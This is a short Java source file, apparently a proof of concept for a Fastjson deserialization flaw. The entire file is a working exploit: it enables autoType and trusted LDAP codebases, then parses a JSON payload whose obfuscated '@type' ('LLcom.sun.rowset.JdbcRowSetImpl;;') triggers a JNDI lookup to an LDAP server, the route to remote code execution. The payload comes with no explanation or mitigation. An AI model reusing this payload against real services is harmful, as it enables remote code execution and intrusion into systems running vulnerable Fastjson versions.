package com.example.fastjson220523poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class JNDI1242 {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        String payload = "{\"rand1\":{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://localhost:1389/Object\",\"autoCommit\":true}}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(payload);
    }
}
